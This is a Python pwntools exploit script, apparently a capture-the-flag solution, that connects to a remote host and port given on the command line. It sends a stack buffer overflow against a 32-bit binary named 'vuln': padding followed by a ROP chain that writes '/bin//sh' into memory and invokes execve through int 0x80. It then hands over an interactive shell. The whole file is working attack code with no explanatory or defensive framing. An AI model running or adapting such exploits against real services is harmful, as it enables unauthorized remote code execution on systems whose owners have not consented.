from pwn import *
import sys


# ____________________________RETRIEVING THE HOST AND PORT AT ENTRY__________________

if len(sys.argv) != 3:
    print('[-] Usage : python3 exploit.py <HOST> <PORT>')
    sys.exit(1)

host = sys.argv[1]
port = sys.argv[2]

# ___________________________________________________________________________________


# ________________________________CONNECTING TO THE SERVER_____________________

p = remote(host, port)
#p = elf.process()

# _____________________________________________________________________________


# _________ALL THE FILES WE NEED__________

elf = ELF("./vuln")

# ________________________________________


# __________________________ADDRESSES NEEDED FOR PAYLOAD_______________________

padding = 'A'*28
# the result of the command: ROPgadget --binary vuln --ropchain
# ______________________________________________________________________________


# __________________________BUILDING THE PAYLOAD________________________________

payload = padding.encode()
payload += p32(0x080583c9)  # pop edx ; pop ebx ; ret
payload += p32(0x080e5060)  # @ .data
payload += p32(0x41414141)  # padding
payload += p32(0x080b074a)  # pop eax ; ret
payload += b'/bin'
payload += p32(0x08059102)  # mov dword ptr [edx], eax ; ret
payload += p32(0x080583c9)  # pop edx ; pop ebx ; ret
payload += p32(0x080e5064)  # @ .data + 4
payload += p32(0x41414141)  # padding
payload += p32(0x080b074a)  # pop eax ; ret
payload += b'//sh'
payload += p32(0x08059102)  # mov dword ptr [edx], eax ; ret
payload += p32(0x080583c9)  # pop edx ; pop ebx ; ret
payload += p32(0x080e5068)  # @ .data + 8
payload += p32(0x41414141)  # padding
payload += p32(0x0804fb90)  # xor eax, eax ; ret
payload += p32(0x08059102)  # mov dword ptr [edx], eax ; ret
payload += p32(0x08049022)  # pop ebx ; ret
payload += p32(0x080e5060)  # @ .data
payload += p32(0x08049e39)  # pop ecx ; ret
payload += p32(0x080e5068)  # @ .data + 8
payload += p32(0x080583c9)  # pop edx ; pop ebx ; ret
payload += p32(0x080e5068)  # @ .data + 8
payload += p32(0x080e5060)  # padding without overwrite ebx
payload += p32(0x0804fb90)  # xor eax, eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0808055e)  # inc eax ; ret
payload += p32(0x0804a3d2)  # int 0x80

# ______________________________________________________________________________


# _______________________SENDING THE PAYLOAD TO THE SERVER______________________

p.recvline()
log.info("[+] sending payload to the remote server")
p.sendline(payload)

# ______________________________________________________________________________


p.interactive()
